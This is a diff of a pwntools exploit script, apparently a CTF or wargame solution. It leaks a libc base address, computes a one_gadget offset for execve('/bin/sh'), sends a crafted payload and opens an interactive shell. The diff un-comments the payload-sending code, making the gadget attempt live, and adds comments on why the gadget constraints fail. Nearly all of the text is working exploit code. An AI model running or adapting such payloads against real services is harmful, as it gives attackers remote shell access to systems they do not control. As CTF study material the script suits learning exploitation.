@@ -6,7 +6,6 @@
 import sys
 from pwn import *
 
-# 스트링을 DE:AD:BE:EF 형태로 프린트해준다.
 def hexify(x):
     return ":".join("{:02x}".format(ord(c)) for c in x)
 
@@ -67,25 +66,25 @@ if __name__ == "__main__":
     LIBC_BASE = mmap - 0x5ea000
     log.info('LIBC_BASE: %#x' % LIBC_BASE)
 
-# ONE_GADGET approach failed! couldn't meet the constrains.
+# ONE_GADGET approach failed! couldn't meet the constraints.
 #
 # 0x4526a execve("/bin/sh", rsp+0x30, environ)
 # constraints:
-#   [rsp+0x30] == NULL -> can not access!
+#   [rsp+0x30] == NULL -> can't access! (mmap'ed to PROTO 0)
 #
 # 0xf66c0 execve("/bin/sh", rcx, [rbp-0xf8])
 # constraints:
-#   [rcx] == NULL || rcx == NULL 
+#   [rcx] == NULL || rcx == NULL  -> can't set rcx to 0!
 #   [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL
 #
-#    ONE_GADGET = LIBC_BASE + 0xf66c0
-#    log.info('ONE_GADGET: %#x' % ONE_GADGET)
-#
-#    payload = ""
-#    payload += p64(24)
-#    payload += p64(0xcafebabe)
-#    payload += p64(mmap+0x1500)
-#    payload += p64(ONE_GADGET)
-#    r.send(payload)
+    ONE_GADGET = LIBC_BASE + 0xf66c0
+    log.info('ONE_GADGET: %#x' % ONE_GADGET)
+
+    payload = ""
+    payload += p64(24)
+    payload += p64(0xcafebabe)
+    payload += p64(mmap+0x1500)
+    payload += p64(ONE_GADGET)
+    r.send(payload)
 
     r.interactive()
